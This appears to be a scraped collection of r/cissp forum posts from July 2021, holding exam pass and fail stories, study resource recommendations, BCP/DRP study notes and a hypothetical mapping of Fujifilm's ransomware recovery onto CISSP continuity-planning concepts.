Per my previous post [here](https://www.reddit.com/r/cissp/comments/oexlqz/cue_the_panic_5_days_until_exam_date/?utm_source=share&utm_medium=web2x&context=3), I have five years experience in a non-technical role within InfoSec. No technical background whatsoever. I'd been studying off and on for a little over a year, four consecutive months of intense study, and utilized the usual suspects: Shon Harris AIO, 11th Hour, IC2 OSG, Destination Certification MindMaps, Boson, PocketPrep, handwritten notes, flashcards and all of Kelly's videos on Cybrary. I’d also taken a 10-week boot camp class three times.

I knew there were topics I didn’t have down 100% but felt I *probably* knew enough to get me by. When I sat down at the computer to take my exam, I knew I was in trouble 20 questions in. The questions looked so foreign and vague. I read and reread and reread every question, breaking the sentence down by word, looking for some semblance of anything I’d seen before. I couldn’t make sense of any of it. I had anticipated this since that’s what everyone says but that didn’t cushion the shock.

I went all the way to 150 questions. I saw a lot of questions on SDLC, at least five questions on SOC compliance and a few on DRP/BCP. Nothing super technical with the exception of a few IPSec and tunneling protocol questions. Nothing on Kerberos, nothing on OSI. Out of all 150, I felt confident I knew the answer on maybe 5 questions. 

What’s really crazy is that I had “think like a manager; don’t DO anything” tattooed on the inside of brain going in. But none of the questions, nor any of the answers, within my exam were structured that way or provided answers that were that high-level. I’m not a technical person so it’s not my instinct to “fix” anything. There weren’t any “weeds” to get into. The questions weren’t super technical but they most definitely weren’t high-level. Somewhere in between, if that makes sense. 

I was below proficiency in four domains, near proficiency in three, and above in one domain. Interestingly, the domains I’d considered my weak domains while studying were my strongest, and my strong domains were “below proficiency.”

So now I’m trying to decide what to do: whether to give it another go or maybe try another certification like Security+ to help build up my confidence. There’s a real big part of me that wants to keep going and build onto the momentum I had and try again in 60-90 days. There’s another smaller part of me that wants to walk away from it completely and get my life back again and enjoy the rest of my summer.

Any advice, opinions, feedback? Should I try again or go for Security+? Is this just too big an elephant to eat for a non-technical professional?",2021-07-18

Quick question. do we have to know the Electronic Discovery Reference Model (EDRM) process in order?",2021-07-18
1686,om95hn,BCP/DRP Quick Notes,"Some general BCP/DRP notes I had lying around if it helps anyone:

At a high-level, the most important thing to remember is that a BCP/DRP program has two main objectives: the first one is to preserve human life, to keep the human heart beating.  Second is one of the corners of the CIA Triad: availability.  Much like the human heart, the second high-level objective is to keep the lights blinking and systems online.

The topic of proper business continuity and disaster recovery planning is **highly testable**.

BCP process and steps (Not specifics, just the general flow)

* Components of the Business Impact Analysis (ARO, MTTR, MTBF, SLE)
* The idea that all stakeholders of a BCP should be involved in the planning
* Business continuation strategies
* The importance of documentation

**Here are some important concepts to remember**:

* The process of recovering an organization's critical business functions after a disaster is known as BCP
* Dealing with a more immediate or specific emergency is known as DRP.
* Difference between BCP and DRP
* BCP is more high-level than DRP.  DRP falls under the umbrella of BCP.
* ""What if our main data center was destroyed by an earthquake, what do we do?"" - That's BCP.
* ""What if our firewall failed at our main data center, what do we do?"" - That's DRP.
* The start of any organization's DRP/BCP program must have the approval of the senior management team
* Management's approval is also a show of their support
* BCP/DRP is all about documentation, documentation, documentation
* According to the CISSP, the first thing to look for in a disaster is the proper documentation that contains procedures and guidelines on how to deal with a disaster
* As with all things CISSP, keep the BCP/DRP document alive with regular updates.  Changes to the organization's governance, infrastructure, or an addition of a new technology should be reflected in the BCP/DRP.  Users and executives alike should also accumulate a certain level of training, education, and security awareness to contribute to a strong BCP/DRP program.

**Here are some types of disasters**:

* Man-made
* Negligence
* Warfare
* Fires
* Terrorism
* Insider threat
* Cyber attack
* Natural
* Flood
* Earthquake
* Tornado
* Tsunami

**The basic steps of a sound BCP are**:

* Phase 1: Scope and Initiation
* Phase 2: Business Impact Analysis
* Phase 3: Recovery Strategies and Continuity Development
* Phase 4: Implementation and Testing
* Phase 5: Maintenance

**RTO vs RPO vs MTTF vs MTTR**

RTO is the maximum amount of time that is needed to bring critical business functions back to normal operating status before that business is crushed.

RPO is the measure of at what point in time a business can go back and still salvage enough data to fully operate.  For example, can a business lose all the data it has accumulated in the last 10 minutes and still operate as a business? Probably.  But can it lose all the data it has accumulated in a 12 hour period and still function? This depends on the type of business.  A company that deals with the stock market and money, probably has a really short RPO, compared to a school with a database of past test scores, which could have a longer RPO.

MTTF as we stated is the same thing as MTBF.  It is the measure of how long something is supposed to operate before failure.

MTTR is the amount of time required that is necessary to bring a critical business function back to operation.  The mean time to recovery for your 2nd monitor in a dual monitor setup can probably be 72 hours to a week before you start finding it necessary to have a 2nd monitor again.  The mean time to recovery for your mouse is probably a lot shorter, maybe minutes to hours?

I took the test yesterday just out of whim. I'm a network administrator with 8 years experience. I honestly think that Security+ was harder than the CISSP exam and I think that could be attributed to the large body of knowledge and question pool that usually comes with CompTIA exams. I'm at the tail end of a Cybersecurity degree so maybe that helped out but I just went in to the test with a ""ain't nothing to it but to do it"" attitude. The body of knowledge illustrated by ISC2 is crucial to planning out how you need to study if you have prior knowledge of the field. I think my networking experience helped out too. The toughest part for us technical folks I believe would be moving away from our traditional thought process when it comes to solving problems. There are going to be multiple choices that feel like the right answer but it's all about management mentality that'll help find the ""most"" right answer. CBT nuggets helped as a sort of passive learning tool just by being able to put it on while I'm driving too and from work. For everyone else wishing to pursue this certificate I wish you all the luck!",2021-07-15
1696,oksl9c,Provisionally passed today @ 120 questions,"I provisionally passed the CISSP exam today @ 120 questions at in about 2 hours on my first attempt.

**About Me** - 9 years of experience in IT Audits, Risk and Compliance, and conducting Security Assessments. Studied for close to 6 months.

**Preparation**:
 * This subreddit - Honestly I would not have passed if it wasn't for you guys. All the resources I used below (except the OSG) I found out through all of you.   
 * OSG 8th edition - very comprehensive but I think one of the best resources.   
 * Kelly Handherhan's course on Cybrary - Her delivery and teaching style cements concepts into your brain.   
 * Destination Certification Mindmap videos and CISSP CRAM on Youtube - Very useful for reinforcements. Highly recommend watching these 1 or 2 weeks before the exam   
 * CISSPprep.net - This one was amazing. I felt the real exam questions were similar to the questions here. It was frustrating because I was scoring only 60% on an average but helped me a lot in identifying my weak areas.  
 * Eric Conrad 11th Hour CISSP - Unpopular opinion but this didn't work for me.   
 * Official practice tests 2nd edition - Make sure to read the reasons for why something was right or wasn't right.  
 * Kelly Handerhan - why you will pass the CISSP - cannot recommend this enough.   

**The Exam**: Can't say anything that hasn't been said before. Most of the questions I could boil it down to two options, some questions were direct. I honestly thought I failed. Do not bother memorizing anything. I made sure I read each question 2-3 times and put on my manager hat. 

Good luck to everyone who's preparing.",2021-07-15
1697,okfajm,Passed my CISSP provisionally.,"So I wrote my CISSP test today and passed provisionally. I am thrilled, but I also put a lot of work into it, so thankful as well. A little about me... I have about 15 years in IT professionally. Much of that in dev and cyber.

1st impression... Test was slightly easier than I thought it would be. 

Materials: 

Official study guide (8th edition)

2x the official questions.. 2nd and 3rd editions (of which I completed all questions)

\-you must understand the why behind the question.

About 600 flash cards I hand wrote and studied from.  

I studied seriously for about 3 months. But quite honestly I am always reading about cyber/cryptography and I am avid cyber podcast listener.

1707,oi6439,Passed - 2'nd Attempt,"All, 

Would just like to give my 2 cents since I passed the exam yesterday and previously posted in this forum about failing this exam in February.  Honestly, it was heartbreaking back then and I didn't even know if I wanted to go through the process again.  I somehow found the motivation to give it one more try and I passed yesterday with literally seconds left at 120+ questions.  I thought for sure I would fail or that I'd run out of time as the questions kept coming in. 

The exam is an absolute beast and I don't think any amount of studying will fully prepare you for this thing.  Even on the second attempt, I felt complete beaten up by the test and saw things that I saw no where within the study materials.  I'd estimate I studied over 250+ hours combining from the first test. 

I honestly can't say anything that you don't already know.  You need to study the normal materials, but you also just need to have the right mindset.  Thinking like a manager is easy to say, but I'm just not sure how much that carries on this test when you're going through it.  I'd say my best advice is don't worry about knowing specific definitions, but knowing exactly how everything works in a real world setting is much more important. 

Also I went with the approach of reading the question multiple times and even purposely slowed down on questions I knew the answer.  I don't think this is a good approach considering I literally had seconds left with potentially a LOT of questions left if the exam was to continue. 

I am beyond relieved and taking some much needed time off.",2021-07-11
1708,oi3d0v,"Passed @100 - 120 minutes, 2nd Attempts","I cannot explain the joy and mental relief of passing this exam, especially after failing on 1st attempt. I was panic reading until last minute trying to cramp as much knowledge as possible, my best advice is to relax on the exam day.  After around 15-20 questions I started to develop the feeling that I will surely fail the exam.  Like many of you said in past no test bank will prepare you for the actual exam questions. They are worded differently and make you feel tempted to click the wrong answer, be sure to read the question multiple times. There were questions where i purely guessed the answer as I never read those topics in my life. I was mentally exhausted and was preparing for the worst and after 100 question the test stopped.  I went to the front and received the result and to my surprise i passed, i couldn't hold my excitement and shouted a big YEESSSSSSSS.  While collecting the items the tears rolled down (its okay to cry). This exam was not just exam it was my dream, I am not sure what it will hold in future but it was my first professional level exam and i gave all for this exam. I always stayed around 2 hr after work just to study for the exam. I prepared this exam for almost 1 year getting distracted in between with free COMPTIA beta exams. I am currently in US in F1 visa (student) and its really hard to find the Job, the struggle is REAL.  My Background 5 Years in General IT (Network support/ Help Desk support/Jr System admin stuff )in home country never had any true Security Position. I want to get my foot into Security, i hope this certification will help at least to pass through the ATS.  I currently hold CCNA, Security+, and recently took CompTIA Pentest beta and CASP beta.   


Following are the material i used, i will not rate as i am not good at it :) everything was helpful during the journey.

* (ISC)2 CISSP Certified Information Systems Security Professional Official Study Guide 8th Edition 
* (ISC)2 CISSP Official Practice Test, 2e. I would recommend to register it online so that it will be easier and can explore other features.
* Eleventh Hour CISSP Study Guide
* Boson Practice Test - Make sure to read the explanation. 
* Destination Certification - YouTube channel - Rob Witcher. This can be helpful to refresh you content.
* And many random YouTube videos. 
* And yes this SUB for others experience and motivation.

1709,ohxoha,Passed today - was certain I didnt!,"First - I'm making this post because reading everyone elses helped me a LOT. So, Reddit = 10/10

Second - I'm an idiot, I don't learn fast, and this shit was hard to study for. If you are reading this you are smarter than I am - you will pass this.

The exam was brutal. 20 questions in and I'm already mentally preparing to fail. The test stopped at 100Q and I would have bet $100 it was because I couldn't mathematically pass with more Qs. I shit bricks when I saw the Congrats. So here my biggest takeaways -

I used very few resources

\- the 2018 official guide and matching practice exam book(has 1000+ Q's, get this!),

\-the Syngress 3rd edition study guide and the Syngress 11th hr book (same authors)

\- Boson practice tests.

\-Thats it.  No new material studied for the updated exam - not needed!

Here's what I did

\- read every book, cover to cover, and highlighted the important concepts /facts.  If any of the material puts information in an outlined box - that's not extra info, its stuff you REALLY need to know.

\-Practice tests. Do as many as you can, find your weak domains, go back to the books and skim through your highlights, and take more tests.  Do NOT memorize the answers to your practice test, I promise this is a sure way to fail.

&#x200B;

* Key to passing- Answer your practice question correctly, then explain to yourself \*why\* the question was correct.  I didn't come across a single question on the real exam that resembled anything close to the 2000+ practice questions I took, but understanding why you chose the practice question answer is the secret sauce.  Add Kelly Henderson video ""Why you will pass"" and you can shit bricks when you see ""Congratulations"" on your test results too.",2021-07-11

1713,oh9f9h,"Passed at 100 questions, ~2 weeks of study, 7 years IS experience","
Got sort of voluntold to get this by EOY about a month ago. Did the Training Camp bootcamp (I do not recommended, more below) last week as I had a “free” week between engagements. Hadn’t done anything at all prior to that week. Exam was not yet scheduled at the start of bootcamp. A couple days into the class one opened up for today, so I grabbed it. 
I’ll just say that the timing with this PrintNightmare… nightmare could not have been worse.

I did the bootcamp (Monday-Saturday morning).
Did nothing on Sunday.
Did a few practice tests Monday (holiday)
Tuesday actually got some real studying with notes and everything!
Wednesday all hell broke loose with the PrintNightmare patch and that sort of took over the rest of the week for me. My study time turned into very short (10-15 question) practice tests when I could grab a few minutes during the workday, then did the real ones (100-150) after hours. 
Exam was this afternoon, Friday, and I can’t wait to actually sleep tonight. 

I passed at 100 questions and I have no idea what the time was.
I was just as surprised how confident I was with many of the questions as I was with how many I stared at and second guessed for probably far too long. 

Study materials:
- Training Camp Bootcamp - I chose the virtual classroom option, not knowing that it was actually a hybrid class and I’d basically just be sitting on mute watching a live class with no real interaction. The instructor I had elected not to use the ISC2 training materials provided his own stuff, which he had not yet updated for the new CBK. There were some other issues, but those was the main ones. 
- CISSPrep - I literally got an account last night after seeing someone on here mention that their practice tests are hard. I wish I’d known about that sooner, probably would have passed on Training Camp, or any live training, entirely. 

Practice exams:
- CISSPrep - I found these to be the best. They’re hard, and it can be discouraging to do poorly. I found that the questions forced me to think the right way. Feedback on missed questions is both great and can be incredibly frustrating because if you miss a “not tricky” one it forces you to go look it up yourself and you actually LEARN.
- Sybex (latest version of the book, online question bank, and the app) - these were ok. The online bank and the app didn’t sync well, so I kept getting repeat questions despite toggling that setting off. It could stand to give better feedback on missed questions. 
- PocketPrep - Found it useful for short quizzes. Probably could have gone without this one but that’s ok. I liked being able to see the user average.
- CCCure - This was way more frustrating than it was helpful. I guess they let others contribute to their test bank to have it be like the real question pool where you’ll encounter questions written in different ways, but after awhile you start to be able to pick out questions by author, especially the bad ones, and there are bad ones. And with that comes a lot of inconsistency in answer explanation. Definitely could have gone without this one, and it was the most expensive by more than double. It was also recommended by the TC instructor but that’s neither here nor there.


Wow I did not intend for this to be so long, I’m sorry! I do hope this can be helpful to someone!!",2021-07-10
1714,oh3qjj,"Pass @ 100 Questions - 2 weeks of study, 10 years of IS experience (4yrs as CISO)","**And if you're newer to the industry: Even as a CISO, I didn't know a lot of this. So good on you if you can pass on the first attempt!**

About 5 years ago I was planning on getting my CISSP, but I got a promotion to a CISO and never felt the need to get it. Fast forward to remote work culture (and a few kids later) and now I'm re-evaluating where I want to be in the future (hint: It's less management and more technical problem solving).

I found this board and noted a few things. One that stood out was the PocketPrep resource. I took a few free practice exams to gauge where I was. Initial tests showed that I was averaging about 60%. I figured with a bit of hard-core ADHD studying, I could get it done. I bought the 8th edition of Shon and read that from cover-to-cover (highlighting all the important pieces) over the course of a week (coffee break? Grab the book. Bathroom break? Grab the book. Every meal? Grab the book).  I subscribed to PocketPrep and after reviewing Shon, I took a few exams. Where I was coming up short, I went back and refreshed on those domains. After burning through the rest of the PocketPrep question bank (with about 3 days to go), I found a question bank from Cybrary/Kaplan ([https://app.cybrary.it/immersive/enrollment/activity/27008376](https://app.cybrary.it/immersive/enrollment/activity/27008376)) and used their bank. After going through those questions, I realized that Shon was a little light in certain areas (despite the fact that it's 1300 pages). If I had more time, I probably would have acquired their referenced source as Shon does did not even reference some of the items found in the Kaplan questions ([https://www.amazon.com/CISSP-Cert-Guide-3rd-Certification/dp/0789759691](https://www.amazon.com/CISSP-Cert-Guide-3rd-Certification/dp/0789759691)).

Overall the exam included a lot of ""BEST"" or ""MOST"" answers and as a professional who lives in grey waters, I could constantly hear myself say ""It depends"", but context seemed to always be lacking. I honestly still don't know what the right answer was for most of them as often times it felt as though all 4 were correct, it just depended on your definition of ""BEST"".

At 100 questions/90 minutes I got kicked out. Since I was already borderline when I first took some practice questions, I took that as a good sign.

My job experience:  
4 years CISO (Definitely helped as I've dealt with a lot of this information from OJT and never heard of a lot of it when I was in my engineering roles)  
5 years in Analyst/Engineer Roles  
10 years of various IT/Sysadmin positions  


If you've been in the industry for a while, these questions still suck, but just buckle down for a few weeks-month and press through it. You got this!

And if you're newer to the industry, even as a CISO, I didn't know a lot of this. So good on you if you can pass on the first attempt!",2021-07-09

1716,ogv3ld,Passed at 150 Questions and 3 Hours,"Took the exam and passed at 150 questions. I was pleasantly surprised and to be honest I did not expect to read Congratulations on the sheet after I left the testing center. 

One of the weirdest elements of my exam was that it almost felt like the exam was trying to get me to pass. As I passed question 100 I received many questions on concepts that I was most strong in. It really did start to mess with my head because I just assumed that the exam was just feeding me questions to get to 150 as I couldn’t understand how I got the same question on SOC reporting rephrased 5 different ways. 

Studying consisted of:

- Training Camp Boot Camp
- CISSP Exam Cram Youtube Videos
- Study Notes and Theory Test Questions (~200)
- Sybex Test Questions (~300)
- Luke Ahmeds How to Think Like a Manager for the CISSP

Overall i’d say the Exam Cram videos were the best to jog my memory on all the concepts leading up to the Exam. I don’t think I took the conventional study method as I took the Training Camp bootcamp and sat for the exam a few weeks later. I’ll be honest that my exam prep wasn’t the greatest as I only had limited nights and weekends to dedicate. But the week leading up I had 2 full day cram sessions (the day before and the day of the exam).

1720,ogfy0o,Passed the CISSP exam last week. Here's how I studied.,"I'll start with a big thank you to everyone that has posted what worked or didn't for them while studying. I gained a lot of insight browsing through numerous posts. I don't have any incredible insights, but below is what I used to pass the exam and hopefully someone can get some use out of it.

Almost all of the sources I used are available for free via O’Reilly/Safari Online if you have a DoD email.

 

Video Courses:

- Cybrary CISSP Video Course [Free]- Kelly Handerhan (15 hours) 
This course does a tremendous job of highlighting all of the major topics in each domain. Provides examples that make concepts relatable and easy to digest.


- CISSP Certification Video Boot Camp [Free w/O'Reilly account] – Thor Pederson (24.5 hours)
Provides a lot of practical examples. Examples are framed in a way that aligns to the “CISSP mindset.”


- CISSP Cert Prep [Free trial via LinkedIn Learning] – Mike Chapple (24 hours)
This was the only source updated for the new version of the exam released in May that I used. This series does a good job covering Domain 3 compared to the other sources.

- CISSP Complete Video Course, Second Edition [Free] – Sari Greene (26 hours)
This course is more formal and in-depth, heavily focuses on practical application of topics (some are not relevant to the exam).

- Mind Map [Free] – YouTube (6.5 hours)
Short and well-produced. They do a good job of summarizing topics within each domain and provide an organized view of the material. It’s a good source for a quick overview of each Domain or as a last minute review.



Text Materials:

- Eleventh Hour CISSP Study Guide [Free with O'Reilly]
Good for an overall introduction to CISSP topics. Some of the topics are dated, so keep that in mind if you use this for review.
 
- (ISC)2 CISSP Certified Information Systems Security Professional Official Study Guide 8th Edition [$40]

- “Sunflower” CISSP Summary Version 2.0 [Free]
Wasn't a fan of this, but I did use it as a final review.
 

Practice Exams:

-(ISC)2 CISSP Official Study Guide, 8e [Free if you buy the book]

- CISSP Official (ISC)2 Practice Tests [Free with O'Reilly account]


Misc:

- Why you WILL pass the CISSP – Kelly Handerhan via YouTube
Great job of covering the mindset you need to pass the exam.

- Essential CISSP Exam Guide: 2018 CBK [$14.99] – Audible (17 hours)
The audio quality is not the best, but I found this to be useful when I didn’t have time to sit down and study.

 

My Study Schedule:

I studied over a 3 month period. The first month was largely spent easing into an overview of each domain and trying to establish foundational knowledge to build upon later. During the first month I totaled 62 hours of study, a little over 2 hours per day. The second month was focused on diving deeper into the material, powering through multiple video courses, and taking a couple practice exams to determine where I stood. During the second month I increased my total study hours for the month to 82, averaging approx. 2 hours and 40 minutes per day. I spent the final month reading the official study guide and taking practice exams (I answered approx. 1,500 questions during this period). Overall, I spent 110 hours studying in this final month, averaging a little over 4 hours per day. I increased my study efforts during the final week before the exam, studying 36 hours during the final 7 days. All of this time was spent reviewing and not trying to learn new material.

 

Recap:

Month 1: 62 hours (2 hrs/day) - Intro to each domain
Month 2: 82 hours (2.5 hrs/day) - Deep dives
Month 3: 110 hours (4 hrs/day) - Practice Exams and reviews
 

Final Thoughts:

1. Develop a plan early and stick to it. Use some of the shorter study items to identify your strong and weak domains. Build your study plan around these results.

2. Don’t try to become an expert in your weak domains. Put in the time to become proficient, but don’t ignore the other domains.

3. Learn the logical processes as opposed to memorizing exact steps. Understand how everything fits together instead of memorizing definitions.

4. Remember to approach the test with the appropriate mindset.

5. Practice tests are important to identify knowledge gaps, but don’t try to memorize the answers. Read the explanations and try to understand why each answer is the correct choice.

6. Take a few breaks from studying where you don’t review any CISSP material for a day or two. Especially the day before the exam.

 

TLDR: There is a lot of free material available to those with a DoD email account. Set a goal and stick to it. Take some breaks and find time to relax and have some fun.

I'm not the best at absorbing information from a textbook. I learn best in a classroom setting with lectures, notes, and textbook.

My local community college doesn't offer any classes purely focused on the CISSP unfortunately. I already checked there.

I am looking at doing some video training and I see both Larry Greenblatt's and Mike Chapple's courses are top in all the comments.  I was wondering which would be the best to go with.  From what I'm seeing they are both really good and I would do well with either.  I am leaning more toward's Larry's as I can download those as audio files and listen to them in the car, which is great for the 2-4 hours I spend in the car on Saturday/Sunday with time on my hands.

Thank you all for the responses.  I think I will use Larry's as I do like his style.  The video about the test posted below was insightful.

1730,of0f0r,Passed today. Everything they say is true...,"I passed today with 100 questions in about 80 minutes. All of my questions were from left field. It's like the test writers said ""okay, you read the Sybex Guide? Good, so you know the terminology. But since you have 5+ years of security experience, you should know how to solve this hypothetical problem that's tangentially based on the this risk management principle..."" 

It's like it doesn't test you on your knowledge of the material, but rather on your ability to internalize a and articulate the principles in scenarios you've never contemplated. 

Or what's more -- it's like you're going to an oracle and telling her you're worthy of CISSP. You act like you're worthy, but the whole time, deep down, you question if you're really worthy (i.e. you expect to see FAIL at the end). In then end the oracle is never wrong. Now I just have to wait until my psychometric evaluation is complete to see if I can get past my provisional pass. Hopefully I'm worthy. 

Study materials (in no order):

1) Sybex book

2) Mike Chapple LinkedIn Learning (All Domains)

3) Thor Teaches (Domain 1 and 2)

4) Wiley Sybex App quizzes

5) Self-paced Online course from uCertify (paid for by my employer). This has quizzes and labs. 

It's hard to say which one was the best. But the uCertify course was long and I has to finish it all to get a test voucher, so it certainly had the biggest impact on me. 

Good luck to you all!",2021-07-06
1731,of9geh,Fujifilm Ransomware BCP/DRP CISSP Correlation,"Greetings, I wish everyone good luck on their CISSP exam this week.  With all the ransomware news, I was especially impressed with the way Fujifilm handled their ransomware incident.  They didn't pay the ransom and recovered operations from backup.  Just thought I'd share some notes of what I thought Fujifilm's BCP/DRP process may have looked like if it helps to correlate the real-life event to your CISSP studies.  Everything below is hypothetical and just used as an example to apply CISSP concepts to real life.  These are just guesses.  

BCP/DRP Process (General) Steps

  **Step 1** **is defining a policy, narrowing down the scope, and beginning the initiation of the BCP/DRP**

*  For Fujifilm, their senior management probably did have a clear policy and scope defined.  
* We can tell they had a policy and scope because when the article I was reading on the publication “Verdict”, asked the company if they had sufficient backups, their response was “Fujifilm does have **backups** in place as a part of its **normal operations procedure** aligned with its **policy**”.
* If Fujifilm had a policy about normal operations procedures after a disaster, it means they definitely had a policy to have a BCP/DRP plan in the first place, because as we know, nothing gets done in a company without first having a policy from senior management.
* Because Fujifilm had a policy to have a BCP/DRP plan in the first place, it attributed to their successful recovery of operations. 
* Otherwise, if there was no policy or a BCP/DRP plan, things would not have gone as smoothly.
* During the ransomware attack nobody would know what to do, what direction to go, how to handle the situation…nothing.  It takes a policy from management to create the BCP/DRP plan, which will provide the pathway to how to handle a disaster.  

  **Step 2 Business Impact Analysis - Define the critical business functions and resources**

* Fujifilm's Chief of Operations could state that if the data on those servers were being held for ransom, the business would come to a standstill, and the data would be needed back in order to continue operations. 
* The Director of Network Operations could say that if their Content Delivery Network solution were to stop working, that would stop the organization’s e-commerce business process, and would result in a heavy loss of revenue.  
* Both provided a technical issue, but also stated how it would affect the overall revenue-generating process of the company (both technical and high-level reasons)

  **Step 3** **- Contingency Strategies (Decide the most cost-effective and reasonable recovery strategy)**

* According to FIPS 199 an impact level of ""High"" would mean any damage or disruption to assets with this rating could halt everything in the business, the organization, the objectives, the networks, systems, applications
* Suggested backup is real-time replication of data as well as WAN/VLAN replication
* Suggested recovery strategy is a hot site

  **Step 4 - Testing and Maintenance** 

* Out of all the tests, maybe they most likely did a parallel test
* Businesses are hesitant about a full-interruption test as it means to stop the business
* If it was a structured walkthrough then individuals who head their own respective departments come together and discuss responsibilities
* If they did a simulation test, they would have all their BCP coordinators, BCP team, network engineers or their bosses, or other operational and mid-level management there to participate.  
   * Meaning, it’s just a simulation, but you have to act like it's happening.  Fujifilm probably checked to make sure their backups were processing, and ran through some things to see if the backups could be retrieved, without actually fully recovering them.  
   * They just simulated not only the disaster, but also the response, nothing “actually” was done like in a parallel test.  
* And of course, as with all CISSP processes, make sure there is documentation  
* Also updating the BCP/DRP document in case of any of these changes: 
   * Major changes to the company’s network or system architecture 
   * Changes to senior management
   * The addition or removal of certain technology
* Documentation and updating changes to the BCP/DRP document is all part of ""maintenance""

I thought it was neat how Fujifilm didn't pay the ransom and initiated a successful BCP/DRP.

Have a solid week ahead.",2021-07-07

1733,oexlqz,Cue the panic - 5 days until exam date,"Like many, I've just been lurking here, reading nearly every success and horror story. I'm five days out from exam time and the panic is starting to set in. I have five years experience in a non-technical role within InfoSec. No technical background whatsoever. 

I've been studying off and on for a little over a year, four consecutive months of intense study, and have been utilizing the usual suspects: Shon Harris AIO, 11th Hour, IC2 OSG, Destination Certification MindMaps, Boson, PocketPrep, handwritten notes, flashcards and all of Kelly's videos on Cybrary. I've also taken a 10-week  bootcamp class three times (seems excessive now that I'm writing that out!). The OSG was a last minute add but it's been helpful to switch things up a bit; I'd found I was getting too used to Boson's question formatting. 

I'm scoring 75-80% in Boson and the OSG test banks. Around the same in PocketPrep. I've answered thousands of practice questions and made thousands of flashcards. This week I'm trying not to panic-cram but instead focus on really honing in on the BCP, DRP, SDLC and incident response phases/processes. Also Kerberos because those terms are tricky AF. Domain 4 will always be my weakest domain since I had no idea what a packet was and had never heard of the OSI model before starting to study for the CISSP (true story). While I know the basics, I've resigned to the fact I'll never remember what every single protocol does. I'm hoping that my lack of technical background will help me think less like a problem-solver and more like a manager since that's really all I know. 

I've scheduled (and rescheduled) the exam 3 times but this time I'm going for it. My brain is cooked; even if I had another month before the exam, I don't know that I could retain anything additional. Anything you'd recommend for the last couple days before the exam (besides more panic)?",2021-07-06
1734,oene2u,How to pass CISSP with limited budget,"Hi I provisionally passed at 100Q (30 minutes before time) on my 1st attempt. I prepared a long time since if I fail I couldn't retake it for at least a year because its too expensive (I saved money for this exam for almost two years and borrowed money from payday loans for some of the study materials) so failure wasnt an option.

My background:  
Im from a 3rd world country (Poland), Im working as a senior cybersecurity consultant for 6 years. Before that, I've been a Java/Scala developer for 8 years but I decided to go for cybersecurity since there are way too many software developers in my country and the wages were getting lower and lower due to high supply.  I was also always very interested in cybersecurity issues. Besides that, Im programming since I was about 13 and created several open source projects.

Materials used:  
\- All in One Exam Guide 8th edition - this was my primary resource for about 5 months since it was given to me (along with OSG and Think Like a Manager Book) by my colleague who also tried to take CISSP but he given up. I read the entire book very carefully but didnt take much notes. I scored about 80% in the tests. It was very boring and given too much details (history etc), I liked the OSG dry style much better;  
\- OSG 8th edition + practice tests - another resource given to me, I read chapters about domains 1, 3 and 5 since they were relatively unchanged compared to new 2021 exam (according to Mike Chapple comments) for about one month; this time I did many notes; in tests I scored about 85-90%;  
\- How To Think Like A Manager for the CISSP Exam - tiny book so I read it very quickly, pretty good resource;  
\- Mike Chapple videos on Linkedin - FREE for first month and updated for 2021 material so I watched them all during that first free month and did a lot of notes. Mike Chapple said that combining his videos with 8th edition OSG should be enough to prepare for 2021 exam;  
\- Official ISC2 flash cards - FREE, good to learn some definitions, minor mistakes;  
\- OSG 9th edition - one of two resources I bought, read chapters about domains 2, 4, 6, 7, 8 which changed most using speed reading (I got the book about 2 weeks before the exam). Vitalsource Bookshelf app is crap but I've had to use it since my account on amazon was blocked due to failed payments. Registered on Wiley  online learning and took all the tests, scored about 85-90 so same as for OSG 8th - questions vere much easier than those on the exam;  
\- CISSP Mindset Academy - scored 64% on both; few major errors but decent explanations for questions, questions vere more similar to those on the exam;  
\- [CISSPREP.net](https://CISSPREP.net) \- did only the free initial test and scored 80% (15 out of 19), couldnt use full version due to high cost (25$ - beyond my budget);  
\- Watched several youtube videos including Why you will pass the CISSP and How to Pass the 2018 CISSP exam: A Sure Fire Method to Help You Ace the Exam. Tried to watch also Destination Certification videos but I learned about this resource late in the study so I prefered my own already made mind maps to theirs;

Materials did not used:  
\- BOSON - I wanted to give it a try but it was way beyond my budget even with 25% discount and also not updated for 2021 so I decided to pass and use wiley as my primary test bank;  
\- Thor Teaches - ultra expensive also.

The exam:  
\- The questions were rather hard, some of them covered subjects I did not encounter before so I used elimination and reasoning technoques. I read questions and answers very slowly so at question 100 I was left with only 30min - if the test would keep going to question 150 I would be in a big trouble but thankfully it didnt.  
Im not a reddit user but reading this reddit helped me much with my preparations so I decided to share my experience :)",2021-07-06

Good day!


Well not so good for me as I failed the exam after answering 150 questions in 1 hr and 45 mins.


I was thrown with a lot of questions in a certain topic in which I didn't dive that deep. When I checked the OSG, that topic is just discussed in one page and showed additonal links for further reading.


I tried to apply the ""Risk Advisor"" mindset during the exam. I would say I used it properly as I was able to determine which is the correct ""Managerial"" answer from the correct ""Technical"" answer which is focused on fixing things.


For my study plan, I've used OSG, Cybrary, Boson, CISSPrep, and Rob's MindMap for like over 6 months of studying.


I have 7 years of experience under my belt in IT (Telco, NW, Security Engineering) and currently working as InfoSec Consultant.


I am now thinking whether should I retake the exam. If so, I am considering to take it after 6 months or even couple of years. I think this exam is easier for folks who are more seasoned in the industry.


For those who are studying for the exam, don't stress yourself too much. Remember to take a break during your studies as this exam will surely bring a study fatigue.

I am honestly still in disbelief that I passed but I feel like a massive weight has been lifted. 

Study Materials:

I started with Kelly Handerhan’s CISSP Cybrary.it videos. They are amazing! She helped me focus my studies. 

Used OSG 8th edition as a reference book. I did read the end of chapter summaries. 

Rob Witcher’s Mindmap videos on YouTube were AMAZING!!!! 

I read the 11th Hour a week before my exam date to refresh my mind.

I did a lot of practice tests on the Wiley test engine that you can gain access with the OSG book. 

Thanks to this REDDIT community, I found CISSPREP.net. The questions were HARD but they helped me a lot. I have to agree that the way they ask the questions is probably the closest to the format of the exam. 

IT & Security App- I took quizzes whenever I was sitting around. 

I truly want to thank this community. I would find encouragement from everyone's posts, pass or fail. 

Experience:

I have about 14 years of experience in various roles as a SOC analyst, RMF roles, and engineering roles.

Busy studying using the 8th edition and recently on a study group someone said that there is about 200+ pages of new content in the 9th edition. My question is will I be able to continue on the 8th edition and then just watch videos on the new content because I can’t afford to purchase the ninth edition now. 

You may ask why I didn’t wait for the ninth edition is because in my country (south africa) resellers told me that they would only have stock by middle August and I would hopefully have written the exam by then.

Thank you.",2021-06-30

1759,oaki1d,Obligatory I Passed Post,"Took the test this morning at a Pearson Vue center as I was reading some of the horror stories about folks required to re-certify because ISC2 suspected them of cheating at home.

I was not ready for the test.

I was not ready for the test but I passed.

I don't think you can really be ready for the test

&#x200B;

